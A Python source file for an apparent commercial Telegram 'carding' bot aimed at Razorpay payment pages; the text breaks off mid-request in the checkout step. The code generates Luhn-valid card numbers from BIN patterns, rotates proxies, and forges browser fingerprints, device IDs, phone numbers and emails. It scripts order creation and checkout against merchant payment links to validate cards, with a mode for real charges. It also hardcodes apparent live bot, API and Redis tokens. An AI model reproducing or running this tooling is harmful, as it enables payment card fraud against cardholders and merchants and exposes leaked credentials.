#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         RAZORPAY ULTRA BOT v5.0 — COMBINED EDITION          ║
║  Real Razorpay flow • Redis • Keys • Plans • Premium Emojis  ║
╚══════════════════════════════════════════════════════════════╝
"""

import asyncio
import base64
import functools
import hashlib
import html
import logging
import math
import random
import re
import secrets
import string
import time
import json
from datetime import datetime, timedelta
from io import BytesIO
from typing import Optional, Dict, List, Tuple, Set, Any
from collections import defaultdict
from urllib.parse import urlparse, urlencode, quote

import aiohttp
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters,
)

# ═══════════════════════════════════════════════════════════════
#                         CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN       = "8953466998:AAEBRUgXO5yVyUsBwyEcRzbT0gX9kuEtCyY"
API_ID          = 12089203
API_HASH        = "7d85eb5ce156d35f22500fd8ef43e7c2"
ADMIN_USER_ID   = 7363967303

REDIS_URL       = "https://in-swine-133213.upstash.io"
REDIS_TOKEN     = "gQAAAAAAAghdAAIgcDE2YzJmMjQ4OGM1N2Y0YmIxYmI4MWVjYzczMTY4ZmIyNA"

# Limits
MAX_LIMIT           = 500_000
MAX_SPLIT_PARTS     = 100
MAX_LINES_PER_FILE  = 150_000
SEND_DELAY          = 0.30
BATCH_SIZE          = 5
BATCH_DELAY         = 2.5
PROXY_TEST_TIMEOUT  = 8
SITE_CHECK_TIMEOUT  = 10
RATE_LIMIT          = 5
RATE_WINDOW         = 30
FORCE_AMOUNT        = 100   # 1 INR in paise — NEVER use 0

# RZP build tokens (from Go implementation)
RZP_BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
RZP_BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

# Redis key names
RK_SUDO      = "bot:sudo_users"
RK_SITES     = "bot:sites"
RK_PROXIES   = "bot:proxies"
RK_BINS      = "bot:bins"
RK_STATS     = "bot:stats"
RK_BANNED    = "bot:banned"
RK_KEYS_ACT  = "bot:keys_active"

# ═══════════════════════════════════════════════════════════════
#                         LOGGING
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("rzp-ultra-bot")

# ═══════════════════════════════════════════════════════════════
#                     PREMIUM EMOJIS
# ═══════════════════════════════════════════════════════════════

_PE: Dict[str, Tuple[str, Optional[int]]] = {
    "diamond":     ("💎", 4956719506027185156),
    "approved":    ("✅", 4956721670690702265),
    "declined":    ("❌", 6100670215522094562),
    "error":       ("⚠️", 4956611513369494230),
    "cooking":     ("🍳", 4956701046257746974),
    "stop":        ("⛔", 5463358164705489689),
    "money":       ("💸", 5373174941095050893),
    "card":        ("💳", 5445353829304387411),
    "gateway":     ("🌐", 4956560549287560231),
    "site":        ("🔗", 4958689671950369798),
    "bin":         ("🏦", 5264895611517300926),
    "time":        ("⏱",  5382194935057372936),
    "premium":     ("👑", 4958725487682650920),
    "ban":         ("🚫", 4956337889593000947),
    "success":     ("🎉", 6104789175058304052),
    "search":      ("🔍", 4958587679361991667),
    "proxy":       ("📡", 5192802446560232534),
    "key":         ("🔑", 5330115548900501467),
    "fire":        ("🔥", 6100568059724960300),
    "star":        ("⭐", 5226928895189598791),
    "cooldown":    ("⏳", 5451732530048802485),
    "mass":        ("📦", 5463172695132745432),
    "plan":        ("📋", 6154222749691679144),
    "info":        ("👤", 5373012449597335010),
    "redeem":      ("🎫", 5418010521309815154),
    "tds":         ("⚡", 6102484018865901039),
    "loading":     ("🔄", 4956371914323920049),
    "skull":       ("☠️", 5372865660500067203),
    "lock":        ("🔐", 5472308992514464048),
    "location":    ("📍", 4956416504674386959),
    "stats":       ("📊", 4958506272551863292),
    "live":        ("🟢", 4958610528588008305),
    "offline":     ("🔴", 6089120150814985809),
    "crown":       ("👑", 4958725487682650920),
    "check":       ("✅", 4956721670690702265),
    "cross":       ("❌", 6100670215522094562),
    "gift":        ("🎁", 6104789175058304052),
    "sparkle":     ("✨", 6100568059724960300),
    "tool":        ("🛠️", 5465443379917629504),
    "clock":       ("⏱",  5382194935057372936),
    "bolt":        ("⚡", 6102484018865901039),
    "rocket":      ("🚀", None),
    "shield":      ("🛡️", None),
    "wave":        ("👋", None),
    "trophy":      ("🏆", None),
    "coin":        ("🪙", None),
    "chart":       ("📈", None),
}

def e(key: str) -> str:
    item = _PE.get(key)
    if not item:
        return "●"
    char, eid = item
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'
    return char

def safe(text: Any) -> str:
    return html.escape(str(text))

# ═══════════════════════════════════════════════════════════════
#                     REDIS CLIENT (Upstash)
# ═══════════════════════════════════════════════════════════════

class RedisClient:
    """Async Upstash Redis REST client using httpx pipeline."""

    def __init__(self, url: str, token: str):
        self._url = url.rstrip("/")
        self._headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":  "application/json",
        }

    async def _req(self, *args) -> Any:
        cmd = list(args)
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.post(
                    f"{self._url}/pipeline",
                    headers=self._headers,
                    json=[cmd],
                )
                r.raise_for_status()
                data = r.json()
                if isinstance(data, list) and data:
                    return data[0].get("result")
                return data.get("result") if isinstance(data, dict) else None
        except Exception as ex:
            logger.error(f"Redis error ({args[0]}): {ex}")
            return None

    async def get(self, key: str) -> Optional[str]:
        return await self._req("GET", key)

    async def set(self, key: str, value: str) -> bool:
        return await self._req("SET", key, value) == "OK"

    async def sadd(self, key: str, *members) -> int:
        return await self._req("SADD", key, *members) or 0

    async def srem(self, key: str, *members) -> int:
        return await self._req("SREM", key, *members) or 0

    async def smembers(self, key: str) -> Set[str]:
        result = await self._req("SMEMBERS", key)
        return set(result) if result else set()

    async def sismember(self, key: str, member: str) -> bool:
        return bool(await self._req("SISMEMBER", key, member))

    async def lpush(self, key: str, *values) -> int:
        return await self._req("LPUSH", key, *values) or 0

    async def lrange(self, key: str, start: int, stop: int) -> List[str]:
        result = await self._req("LRANGE", key, start, stop)
        return result if result else []

    async def lrem(self, key: str, count: int, element: str) -> int:
        return await self._req("LREM", key, count, element) or 0

    async def llen(self, key: str) -> int:
        return await self._req("LLEN", key) or 0

    async def delete(self, *keys) -> int:
        return await self._req("DEL", *keys) or 0

    async def incr(self, key: str) -> int:
        return await self._req("INCR", key) or 0

    async def hset(self, key: str, field: str, value: str) -> int:
        return await self._req("HSET", key, field, value) or 0

    async def hget(self, key: str, field: str) -> Optional[str]:
        return await self._req("HGET", key, field)

    async def hgetall(self, key: str) -> Dict[str, str]:
        result = await self._req("HGETALL", key)
        if not result:
            return {}
        it = iter(result)
        return {k: v for k, v in zip(it, it)}

    async def hdel(self, key: str, *fields) -> int:
        return await self._req("HDEL", key, *fields) or 0

    async def exists(self, key: str) -> bool:
        return bool(await self._req("EXISTS", key))

    async def expire(self, key: str, seconds: int) -> int:
        return await self._req("EXPIRE", key, seconds) or 0


redis = RedisClient(REDIS_URL, REDIS_TOKEN)

# ═══════════════════════════════════════════════════════════════
#                      RATE LIMITING
# ═══════════════════════════════════════════════════════════════

_rate_map: Dict[int, List[float]] = defaultdict(list)

def check_rate_limit(user_id: int) -> Tuple[bool, Optional[str]]:
    now = time.time()
    reqs = _rate_map[user_id]
    reqs[:] = [t for t in reqs if now - t < RATE_WINDOW]
    if len(reqs) >= RATE_LIMIT:
        wait = int(RATE_WINDOW - (now - reqs[0]))
        return False, f"Rate limited. Wait {wait}s."
    reqs.append(now)
    return True, None

# ═══════════════════════════════════════════════════════════════
#                      AUTHORIZATION
# ═══════════════════════════════════════════════════════════════

def is_admin(uid: int) -> bool:
    return uid == ADMIN_USER_ID

async def is_sudo(uid: int) -> bool:
    if is_admin(uid):
        return True
    return await redis.sismember(RK_SUDO, str(uid))

async def is_banned(uid: int) -> bool:
    return await redis.sismember(RK_BANNED, str(uid))

async def has_active_plan(uid: int) -> bool:
    expiry = await redis.hget(f"bot:users:{uid}", "plan_expiry")
    if not expiry:
        return False
    try:
        return float(expiry) > time.time()
    except (ValueError, TypeError):
        return False

async def is_authorized(uid: int) -> bool:
    if is_admin(uid):
        return True
    if await is_sudo(uid):
        return True
    return await has_active_plan(uid)

# Active payment tests tracker
active_tests: Dict[int, bool] = {}

def require_auth(func):
    """Decorator: check banned → check auth → proceed."""
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if await is_banned(uid):
            await update.message.reply_text(
                f"{e('ban')} <b>You are banned</b> from using this bot.\n"
                f"{e('skull')} Contact support if you think this is a mistake.",
                parse_mode=ParseMode.HTML,
            )
            return
        if not await is_authorized(uid):
            await update.message.reply_text(
                f"{e('lock')} <b>Access Denied</b>\n\n"
                f"{e('key')} You need a valid plan or sudo access.\n"
                f"{e('redeem')} Use <code>/redeem KEY</code> to activate a plan.",
                parse_mode=ParseMode.HTML,
            )
            return
        return await func(update, context)
    return wrapper

def require_sudo_access(func):
    """Decorator: admin or sudo only."""
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if await is_banned(uid):
            await update.message.reply_text(
                f"{e('ban')} <b>You are banned.</b>",
                parse_mode=ParseMode.HTML,
            )
            return
        if not await is_sudo(uid):
            await update.message.reply_text(
                f"{e('lock')} <b>Access Denied</b>\n\n"
                f"{e('crown')} This command requires sudo or admin access.",
                parse_mode=ParseMode.HTML,
            )
            return
        return await func(update, context)
    return wrapper

# ═══════════════════════════════════════════════════════════════
#                  PROXY PARSING & TESTING
# ═══════════════════════════════════════════════════════════════

def parse_proxy(raw: str) -> Optional[Dict[str, str]]:
    """
    Normalise proxy string → dict with url, host, port, user, password, scheme.
    Formats: ip:port | ip:port:user:pass | user:pass@ip:port | scheme://...
    """
    raw = raw.strip()
    if not raw:
        return None
    scheme = "http"

    if "://" in raw:
        parsed = urlparse(raw)
        scheme   = parsed.scheme or "http"
        host     = parsed.hostname or ""
        port     = str(parsed.port or 80)
        user     = parsed.username or ""
        password = parsed.password or ""
        if not host:
            return None
        proxy_url = (
            f"{scheme}://{user}:{password}@{host}:{port}"
            if user else f"{scheme}://{host}:{port}"
        )
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}

    if "@" in raw:
        creds, addr = raw.rsplit("@", 1)
        parts_addr = addr.split(":")
        if len(parts_addr) != 2:
            return None
        host, port = parts_addr
        user, password = (creds.split(":", 1) if ":" in creds else (creds, ""))
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}

    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"{scheme}://{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": "", "password": "", "scheme": scheme}
    return None


async def test_proxy(raw: str) -> Tuple[bool, str, float]:
    """Test proxy via ip-api.com. Returns (ok, info, latency_ms)."""
    info = parse_proxy(raw)
    if not info:
        return False, "Unparseable proxy format", 0.0
    proxy_url = info["url"]
    start = time.monotonic()
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async with sess.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT),
            ) as resp:
                lat = (time.monotonic() - start) * 1000
                if resp.status == 200:
                    data = await resp.json()
                    ip      = data.get("query", "unknown")
                    country = data.get("country", "")
                    isp     = data.get("isp", "")
                    return True, f"{ip} | {country} | {isp}", round(lat, 1)
                return False, f"HTTP {resp.status}", round(lat, 1)
    except asyncio.TimeoutError:
        return False, "Timeout", 0.0
    except Exception as ex:
        return False, str(ex)[:60], 0.0


def get_random_proxy_url(proxies: List[str]) -> Optional[str]:
    if not proxies:
        return None
    raw = random.choice(proxies)
    info = parse_proxy(raw)
    return info["url"] if info else None

# ═══════════════════════════════════════════════════════════════
#                    SITE LIVENESS CHECK
# ═══════════════════════════════════════════════════════════════

RZP_SIGNATURES = [
    "razorpay", "rzp", "checkout.razorpay.com",
    "api.razorpay.com", "razorpay_key", "rzp_live_",
    "rzp_test_", "Razorpay", "razorpay.com",
]

async def check_site_live(url: str, proxy_url: Optional[str] = None) -> Tuple[bool, str, str]:
    """Returns (is_live, rzp_key_found, status_msg)."""
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, headers=headers) as sess:
            async with sess.get(
                url, proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=SITE_CHECK_TIMEOUT),
                allow_redirects=True, max_redirects=5,
            ) as resp:
                body   = await resp.text(errors="replace")
                status = resp.status
                has_rzp = any(sig in body for sig in RZP_SIGNATURES)
                key_match = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', body)
                rzp_key = key_match.group(1) if key_match else ""
                if status in (200, 201, 202) and has_rzp:
                    return True, rzp_key, f"Live ✓ [{status}]"
                elif status in (200, 201, 202):
                    return True, rzp_key, f"Live (no RZP detected) [{status}]"
                elif status in (301, 302, 307, 308):
                    return False, "", f"Redirect [{status}]"
                elif status == 403:
                    return False, "", "Forbidden [403]"
                elif status == 404:
                    return False, "", "Not Found [404]"
                else:
                    return False, "", f"HTTP {status}"
    except asyncio.TimeoutError:
        return False, "", "Timeout"
    except Exception as ex:
        return False, "", f"Error: {str(ex)[:50]}"

# ═══════════════════════════════════════════════════════════════
#                     BIN LOOKUP
# ═══════════════════════════════════════════════════════════════

async def lookup_bin(bin6: str) -> Dict[str, str]:
    """Query binlist.net for BIN info."""
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(
                f"https://lookup.binlist.net/{bin6[:8]}",
                headers={"Accept-Version": "3"},
                timeout=aiohttp.ClientTimeout(total=6),
            ) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    return {
                        "scheme":  d.get("scheme", "unknown").upper(),
                        "type":    d.get("type", "unknown"),
                        "brand":   d.get("brand", ""),
                        "bank":    d.get("bank", {}).get("name", "unknown"),
                        "country": d.get("country", {}).get("name", "unknown"),
                        "emoji":   d.get("country", {}).get("emoji", ""),
                    }
    except Exception:
        pass
    return {"scheme": "UNKNOWN", "type": "unknown",
            "brand": "", "bank": "unknown", "country": "unknown", "emoji": ""}

# ═══════════════════════════════════════════════════════════════
#                   CARD ISSUER DATA
# ═══════════════════════════════════════════════════════════════

CARD_ISSUERS = {
    "visa":       {"prefix": "4",       "length": 16, "cvv": 3, "name": "Visa"},
    "mastercard": {
        "prefixes": ["51","52","53","54","55",
                     "2221","2222","2223","2224","2225","2226","2227","2228","2229",
                     "2230","2231","2232","2233","2234","2235","2236","2237","2238","2239",
                     "2240","2241","2242","2243","2244","2245","2246","2247","2248","2249",
                     "2250","2300","2400","2500","2600","2700","2720"],
        "length": 16, "cvv": 3, "name": "Mastercard",
    },
    "amex":       {"prefixes": ["34","37"],     "length": 15, "cvv": 4, "name": "Amex"},
    "discover":   {"prefixes": ["6011","644","645","646","647","648","649","65"],
                   "length": 16, "cvv": 3, "name": "Discover"},
    "diners":     {"prefixes": ["300","301","302","303","304","305","36","38"],
                   "length": 14, "cvv": 3, "name": "Diners"},
    "rupay":      {"prefixes": ["508528","6069","6070","6071","6072","6521","6522"],
                   "length": 16, "cvv": 3, "name": "RuPay"},
}

def get_issuer_by_bin(b: str) -> Optional[str]:
    for issuer, data in CARD_ISSUERS.items():
        if issuer == "visa" and b.startswith("4"):
            return issuer
        prefixes = data.get("prefixes", [])
        if any(b.startswith(p) for p in prefixes):
            return issuer
    return None

def get_brand(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if len(cc) >= 2 and cc[:2] in ("51","52","53","54","55"):
        return "mastercard"
    if len(cc) >= 2 and cc[:2] in ("34","37"):
        return "amex"
    if cc.startswith("6011") or cc.startswith("65"):
        return "discover"
    return "unknown"

# ═══════════════════════════════════════════════════════════════
#                    LUHN ALGORITHM
# ═══════════════════════════════════════════════════════════════

def luhn_check_digit(partial: str) -> int:
    digits = [int(d) for d in partial]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return (10 - (sum(digits) % 10)) % 10

def luhn_complete(partial: str) -> Optional[str]:
    if not partial.isdigit():
        return None
    return partial + str(luhn_check_digit(partial))

# ═══════════════════════════════════════════════════════════════
#                   CARD GENERATION
# ═══════════════════════════════════════════════════════════════

def expand_bin(bin_pattern: str) -> Optional[Tuple[str, str]]:
    bin_part = bin_pattern.split("|")[0].strip()
    if not all(c.isdigit() or c.lower() == "x" for c in bin_part):
        return None
    expanded = [
        str(random.randint(0, 9)) if c.lower() == "x" else c
        for c in bin_part
    ]
    result = "".join(expanded)
    issuer = get_issuer_by_bin(result)
    if not issuer:
        return None
    required = CARD_ISSUERS[issuer]["length"]
    if len(result) < required - 1:
        result += "".join(
            str(random.randint(0, 9)) for _ in range((required - 1) - len(result))
        )
    return result[:required - 1], issuer


def parse_card_fields(pattern: str, issuer: str) -> Tuple[str, str, str]:
    parts = pattern.split("|")
    cy = datetime.now().year % 100

    def fill(val: Optional[str], length: int, lo: int, hi: int) -> str:
        if not val or val.lower() in ("rnd", "rand", "random", ""):
            return str(random.randint(lo, hi)).zfill(length)
        if "x" in val.lower():
            return "".join(
                str(random.randint(0, 9)) if c.lower() == "x" else c for c in val
            )[-length:].zfill(length)
        digits = "".join(c for c in val if c.isdigit())
        return digits[-length:].zfill(length)

    month   = fill(parts[1] if len(parts) > 1 else None, 2, 1, 12)
    year    = fill(parts[2] if len(parts) > 2 else None, 2, cy + 2, cy + 8)
    cvv_len = CARD_ISSUERS[issuer]["cvv"]
    cvv     = fill(parts[3] if len(parts) > 3 else None, cvv_len, 0, (10**cvv_len) - 1)
    return month, year, cvv


def generate_card(bin_pattern: str) -> Optional[str]:
    try:
        res = expand_bin(bin_pattern)
        if not res:
            return None
        pan_base, issuer = res
        pan = luhn_complete(pan_base)
        if not pan or len(pan) != CARD_ISSUERS[issuer]["length"]:
            return None
        month, year, cvv = parse_card_fields(bin_pattern, issuer)
        return f"{pan}|{month}|{year}|{cvv}"
    except Exception as ex:
        logger.error(f"Card gen error: {ex}")
        return None


def generate_cards_streaming(bin_pattern: str, count: int):
    """Memory-efficient streaming generator with rolling dedup window."""
    window_size = min(count, 10_000)
    seen: Set[str] = set()
    dedup_queue: List[str] = []
    generated = 0
    attempts  = 0
    max_attempts = count * 12

    while generated < count and attempts < max_attempts:
        attempts += 1
        card = generate_card(bin_pattern)
        if not card:
            continue
        if card not in seen:
            if len(dedup_queue) >= window_size:
                evict = dedup_queue.pop(0)
                seen.discard(evict)
            seen.add(card)
            dedup_queue.append(card)
            generated += 1
            yield card


def validate_bin(b: str) -> Tuple[bool, Optional[str]]:
    if not b:
        return False, "BIN cannot be empty"
    part = b.split("|")[0].strip()
    if not all(c.isdigit() or c.lower() == "x" for c in part):
        return False, "Only digits and x allowed"
    if len(part) < 4:
        return False, "BIN too short (min 4)"
    if len(part) > 19:
        return False, "BIN too long (max 19)"
    return True, None

# ═══════════════════════════════════════════════════════════════
#              RAZORPAY HELPERS
# ═══════════════════════════════════════════════════════════════

import hashlib as _hashlib
import os as _os

def _gen_ua() -> str:
    major = random.randint(120, 147)
    build = random.randint(5000, 6999)
    patch = random.randint(50, 249)
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{major}.0.{build}.{patch} Safari/537.36"
    )

def _gen_phone() -> str:
    first = random.choice(["6","7","8","9"])
    rest  = "".join(str(random.randint(0,9)) for _ in range(9))
    return "+91" + first + rest

def _gen_email() -> str:
    names = ["alex","john","mike","sara","david","emma","james","lisa","chris","anna"]
    return random.choice(names) + str(random.randint(100, 9999)) + "@gmail.com"

def _gen_rzp_device_id() -> Tuple[str, str]:
    buf   = secrets.token_bytes(16)
    h     = _hashlib.sha1(buf).hexdigest()
    ts    = str(int(time.time() * 1000))
    rnd   = f"{random.randint(0, 99999999):08d}"
    return f"1.{h}.{ts}.{rnd}", h

def _gen_rzp_session_id() -> str:
    chars = string.ascii_letters + string.digits
    return "".join(secrets.choice(chars) for _ in range(14))

def _extract_json_var(content: str, var_name: str) -> str:
    """
    Brace-counting JSON extractor (NOT regex) — handles deeply nested objects.
    Ported from Go implementation to avoid RE2 truncation bug.
    """
    prefix = f"var {var_name} ="
    start_idx = content.find(prefix)
    if start_idx == -1:
        return ""
    start_idx += len(prefix)
    # Skip whitespace
    while start_idx < len(content) and content[start_idx] in " \t\n\r":
        start_idx += 1
    if start_idx >= len(content) or content[start_idx] != "{":
        return ""
    depth      = 0
    in_string  = False
    escaped    = False
    for i in range(start_idx, len(content)):
        c = content[i]
        if escaped:
            escaped = False
            continue
        if c == "\\" and in_string:
            escaped = True
            continue
        if c == '"':
            in_string = not in_string
            continue
        if in_string:
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return content[start_idx:i + 1]
    return ""

def _get_str(d: dict, key: str) -> str:
    if not d:
        return ""
    v = d.get(key)
    if v is None:
        return ""
    if isinstance(v, str):
        return v
    return str(v)

def _is_balance_keyword(msg: str) -> bool:
    keywords = [
        "insufficient account balance", "insufficient funds",
        "maximum transaction limit", "transaction limit exceeded",
    ]
    return any(k in msg.lower() for k in keywords)

def _is_cvv_keyword(msg: str, code: str) -> bool:
    if "cvv provided is incorrect" in msg.lower():
        return True
    if "incorrect_cvv" in msg.lower():
        return True
    if code.lower() == "incorrect_cvv":
        return True
    return False

# ═══════════════════════════════════════════════════════════════
#         REAL RAZORPAY PAYMENT FLOW  (9-step, no fake)
# ═══════════════════════════════════════════════════════════════

async def check_card_razorpay(
    cc: str, mm: str, yy: str, cvv: str,
    target_url: str,
    proxy_url: Optional[str] = None,
    cancel_mode: bool = True,
) -> Dict[str, Any]:
    """
    Full Razorpay card check ported from Go (autorzp.go).
    cancel_mode=True  → auto-hit (no actual charge, cancel after auth)
    cancel_mode=False → real charge (payment goes through)
    """
    yy2 = yy[-2:] if len(yy) == 4 else yy
    year_full = int("20" + yy2)
    brand     = get_brand(cc)
    ua        = _gen_ua()
    phone     = _gen_phone()
    phone_short = phone[3:]
    email     = _gen_email()
    rzp_device_id, fhash = _gen_rzp_device_id()
    rzp_session_id = _gen_rzp_session_id()

    base_headers = {
        "User-Agent":      ua,
        "Accept-Language": "en-US,en;q=0.5",
    }

    connector = aiohttp.TCPConnector(ssl=False)
    jar       = aiohttp.CookieJar(unsafe=True)
    timeout   = aiohttp.ClientTimeout(total=25)

    async with aiohttp.ClientSession(
        connector=connector,
        cookie_jar=jar,
        headers=base_headers,
        timeout=timeout,
    ) as sess:

        # ── STEP 1: Fetch payment page ────────────────────────
        try:
            async with sess.get(
                target_url, proxy=proxy_url,
                allow_redirects=True, max_redirects=5,
                headers={"Accept": "text/html,application/xhtml+xml,*/*"},
            ) as r1:
                page_html = await r1.text(errors="replace")
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Timeout fetching page",
                    "proxy_status": "DEAD"}
        except Exception as ex:
            return {"status": "error", "message": str(ex)[:80],
                    "proxy_status": "DEAD"}

        # ── STEP 2: Extract Razorpay JSON data ───────────────
        json_str = _extract_json_var(page_html, "data")
        if not json_str:
            return {"status": "error",
                    "message": "Failed to locate Razorpay data on page",
                    "proxy_status": "LIVE"}

        try:
            init_data = json.loads(json_str)
        except json.JSONDecodeError:
            # Try double-encoded string
            try:
                inner = json.loads(json_str)
                init_data = json.loads(inner) if isinstance(inner, str) else inner
            except Exception:
                return {"status": "error",
                        "message": "Failed to parse Razorpay JSON data",
                        "proxy_status": "LIVE"}

        key_id = _get_str(init_data, "key_id") or _get_str(init_data, "key")
        if not key_id:
            return {"status": "error", "message": "Razorpay Key ID not found",
                    "proxy_status": "LIVE"}

        plink = ppid = ""
        keyless_header = _get_str(init_data, "keyless_header")

        if "payment_link" in init_data and isinstance(init_data["payment_link"], dict):
            pl_obj = init_data["payment_link"]
            plink  = _get_str(pl_obj, "id")
            items  = pl_obj.get("payment_page_items", [])
            if items and isinstance(items[0], dict):
                ppid = _get_str(items[0], "id")
        elif "payment_page" in init_data and isinstance(init_data["payment_page"], dict):
            pp_obj = init_data["payment_page"]
            plink  = _get_str(pp_obj, "id")
            items  = pp_obj.get("payment_page_items", [])
            if items and isinstance(items[0], dict):
                ppid = _get_str(items[0], "id")

        if not plink:
            return {"status": "error",
                    "message": "Payment Link ID not found in page structure",
                    "proxy_status": "LIVE"}

        kl_encoded = quote(keyless_header) if keyless_header else ""

        # ── STEP 3: Create order ─────────────────────────────
        order_payload = {
            "notes":      {"comment": "", "name": "User"},
            "line_items": [{"payment_page_item_id": ppid, "amount": FORCE_AMOUNT}],
        }
        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                json=order_payload,
                proxy=proxy_url,
                headers={
                    "Accept":       "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Origin":       "https://pages.razorpay.com",
                    "Referer":      "https://pages.razorpay.com/",
                },
            ) as r2:
                r2_text = await r2.text(errors="replace")
        except Exception as ex:
            return {"status": "error", "message": f"Order req failed: {str(ex)[:60]}",
                    "proxy_status": "LIVE"}

        try:
            r2_data = json.loads(r2_text)
        except Exception:
            return {"status": "error", "message": "Order response parse failed",
                    "proxy_status": "LIVE"}

        order_obj = r2_data.get("order", {}) or {}
        order_id  = _get_str(order_obj, "id")
        if not order_id:
            err_obj  = r2_data.get("error", {}) or {}
            err_desc = _get_str(err_obj, "description") or "Order creation failed"
            return {"status": "error", "message": err_desc[:80],
                    "proxy_status": "LIVE"}

        checkout_id    = order_id.split("_", 1)[1] if "_" in order_id else order_id
        order_amount   = float(order_obj.get("amount") or FORCE_AMOUNT)
        if order_amount < 100:
            order_amount = float(FORCE_AMOUNT)
        order_currency = _get_str(order_obj, "currency") or "INR"

        # ── STEP 4: Get checkout public / session token ───────
        params4 = {
            "traffic_env":        "production",
            "build":              RZP_BUILD,
            "build_v1":           RZP_BUILD_V1,
            "checkout_v2":        "1",
            "new_session":        "1",
            "keyless_header":     keyless_header,
            "rzp_device_id":      rzp_device_id,
            "unified_session_id": rzp_session_id,
        }
        try:
            async with sess.get(
                "https://api.razorpay.com/v1/checkout/public",
                params=params4, proxy=proxy_url,
                headers={"Accept": "text/html,*/*",
                         "Referer": "https://pages.razorpay.com/"},
            ) as r3:
                r3_text = await r3.text(errors="replace")
        except Exception as ex:
            return {"status": "error", "message": f"Checkout fetch failed: {str(ex)[:60]}",
                    "proxy_status": "LIVE"}

        # Extract session token
        sessid = ""
        m = re.search(r'window\.session_token="([A-F0-9]{40,})"', r3_text)
        if m:
            sessid = m.group(1)
        if not sessid:
            m2 = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3_text)
            if m2:
                sessid = m2.group(1)
        if not sessid:
            return {"status": "error", "message": "Session token not found",
                    "proxy_status": "LIVE"}

        rzp_ref = (
            f"https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={RZP_BUILD}&build_v1={RZP_BUILD_V1}"
            f"&checkout_v2=1&new_session=1&unified_session_id={rzp_session_id}"
            f"&session_token={sessid}"
        )

        std_hdrs = {
            "Accept":          "*/*",
            "Origin":          "https://api.razorpay.com",
            "Referer":         rzp_ref,
            "x-session-token": sessid,
        }

        # ── STEP 5: Preferences (fire & forget) ──────────────
        resources = [
            "checkout_version_config","merchant","merchant_features","downtime",
            "customer","customer_tokens","truecaller","methods","experiments",
            "offers","checkout_config","order","invoice","buyer_protection","personalization",
        ]
        pref_payload = {
            "query": [{"resource": r} for r in resources],
            "query_params": {
                "device_id":       rzp_device_id,
                "rtb_device_id":   fhash,
                "amount":          order_amount,
                "currency":        order_currency,
                "option_currency": order_currency,
                "truecaller":      False,
                "qr_required":     False,
                "library":         "checkoutjs",
                "platform":        "browser",
                "order_id":        order_id,
                "payment_link_id": plink,
                "contact":         phone,
            },
            "action": "get",
        }
        try:
            h5 = {**std_hdrs, "Content-Type": "application/json"}
            await sess.post(
                f"https://api.razorpay.com/v2/standard_checkout/preferences"
                f"?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless_header}",
                json=pref_payload, headers=h5, proxy=proxy_url,
            )
        except Exception:
            pass

        # ── STEP 6: Checkout order (fire & forget) ───────────
        form6 = {
            "notes[email]": email, "notes[phone]": phone_short,
            "payment_link_id": plink, "key_id": key_id,
            "contact": phone, "email": email, "currency": order_currency,
            "_[integration]": "payment_pages",
            "_[device.id]": rzp_device_id, "_[library]": "checkoutjs",
            "_[library_src]": "no-src", "_[current_script_src]": "no-src",
            "_[platform]": "browser", "_[env]": "",
            "_[is_magic_script]": "false", "_[os]": "windows",
            "_[shield][fhash]": fhash, "_[shield][tz]": "0",
            "_[device_id]": rzp_device_id, "_[build]": RZP_BUILD,
